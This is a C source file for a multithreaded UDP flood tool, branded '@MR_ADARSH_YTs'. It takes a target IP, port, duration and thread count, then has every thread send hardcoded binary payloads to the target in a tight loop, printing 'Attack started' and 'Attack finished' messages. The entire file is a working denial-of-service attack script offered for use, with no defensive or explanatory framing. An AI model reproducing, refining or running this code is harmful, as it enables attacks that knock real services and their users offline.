#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>

void usage() {
    printf("Usage: ./adarsh ip port time threads\n");
    exit(1);
}

struct thread_data {
    char *ip;
    int port;
    int time;
};

void *attack(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char *payloads[] = {
  
    "\x0A\x25\x8A\x44\xAB\x4C\x8C\x98\x04\x5D\x4F\x3D\x98\x02\x84\x3F\x40\x11\xE4\x43\x51\xFD\xA6\xF9\x34\xB7\x85\x80\x85\x01\x6A\x25\xE9\x10\x30\xFA\x0D\xA0\x43\x32\xE5\xE8\x30\x43\x50\x6E\x2C\xC4\x6C\x4C\x0F\x91\xBD\xBA\xD8\x69\xA4\x02\xC4\x87\x17\xE4\xB9\xB2\x83\xC3\x6B\xBF\xE6\xF8\x8D\x84\xC7\xE5\x0D\x0B\x03\x75\x28\x8F\x28\x62\xFC\xFC\x36\x47\x4B\x64\x77\xC1\xE1\x7A\x3B\xB8\x4E\x95\x3E\xA2\x46\xD5\x4D\x71\x70\x1D\x68\x9F\x10\xC2\x44\x5C\x35\x22\x2E\x70\x90\x81\x9D\x90\x74\xDD\x34\xFB\x41\x00\xAA\x70\xE6\xB6\x57\x47\x21\xF3\x8F\x2A\xB6\xA8\x1D\x14\xE0\x15\x8C\xCF\xE3\x91\x5D\x3B\x9B\x36\x6E\x74\x82\x2C\xC0\x97\x36\x36\x79\xAD\xEF\x58\xA4\xD9\x93\xF1\x8B\xF0\x65\xC6\x2F\xFC\x61\x5A\xD3\xEF\x51\x95\x65\x5F\x30\xD6\x43\xAE\x90\xFE\xA8\x4C\x73\xED\xB2\xD8\x35\x9B\x70\xE8\xFC\xA4\x53\x14\x3E\x30\xC4\xD9\x58\x14\xA5\x7F\x18\xC1\xE1\x9F\xB8\x13\x6C\x91\x1E\x73\x07\xDF\x9B\xB2\x33\xDA\xD3\x9E\xB7\x07\xF2\xA3\x4D\xE4\x35\xE7\xE5\x53\x7E\x18\x4A\x3A\x65\x91\x55\xFE\x07\x2A\xDE\x05\x0D\xBC\x1A\xD5\xCF\x53\x8B\xEB\x4B\xC5\x90\xF6\xD4\x57\x0A\xC4\x1B\xA1\x67\x4F\x8F\x0E\x65\xD5\xB4\xE8\x7A\xEA\x63\xAF\xCA\xD7\x47\xBF\x49\x62\x46\x03\xCE\x62\x46\x6D\xC1\x44\x51\x36\x36\x2C\x63\xBC\x82\xC7\x3B\xCC\x2B\x7B\xFF\xB6\x86\x78\x32\xF1\xD8\x05\x6F\x8B\x08\x85\x90\x4F\x5D\x9F\xC4\x7F\x6A\x41\x51\x41\x6F\x3A\x06\x18\x46\x80\xDC\x89\xF5\xFF\x49\x34\xD4\x88\x9E\x3C\xD5\xE1\x1F\x88\x62\x7D\x14\x5D\x43\x88\x7D\x34\x0D\xC9\x32\xE5",
    "\x14\x7B\x58\xA7\xF3\xA9\xA4\xDD\x30\x47\xDF\xA0\xFA\x3D\x60\xE0\x28\x86\x77\x05\xEF\x45\x34\xAA\x90\xB6\x14\x12\xA1\x26\x01\x73\x83\x50\xA8\xC3\x1D\x23\xDB\xA3\x9F\x3B\x40\x2C\x62\xBC\xA4\x83\x4A\x8C\x9C\x83\xF4\x13\x8B\xE9\x17\xD8\xD7\x26\xE9\x11\x77\xE8\xDF\xFB\x1C\x88\x2C\x8B\x06\xE6\x48\xBF\xDF\xF1\x11\x44\xBB\xA9\x2A\x73\xF8\x90\x46\xD8\xAC\x9A\x31\xE8\x96\xAF\xA4\x3E\xE6\x10\x85\x10\xDD\x8B\xC1\xC9\xE9\xC3\x13\x7D\x12\x83\x49"

    };

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime) {
        for (int i = 0; i < sizeof(payloads) / sizeof(payloads[0]); i++) {
            if (sendto(sock, payloads[i], strlen(payloads[i]), 0,
                       (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                close(sock);
                pthread_exit(NULL);
            }
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int time = atoi(argv[3]);
    int threads = atoi(argv[4]);
    pthread_t *thread_ids = malloc(threads * sizeof(pthread_t));
    struct thread_data data = {ip, port, time};

    printf("Attack started on %s:%d for %d seconds with %d threads\n", ip, port, time, threads);

    for (int i = 0; i < threads; i++) {
        if (pthread_create(&thread_ids[i], NULL, attack, (void *)&data) != 0) {
            perror("Thread creation failed");
            free(thread_ids);
            exit(1);
        }
        printf("Launched thread with ID: @MR_ADARSH_YTs %lu\n", thread_ids[i]);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    free(thread_ids);
    printf("Attack finished join @MR_ADARSH_YTs\n");
    return 0;
}
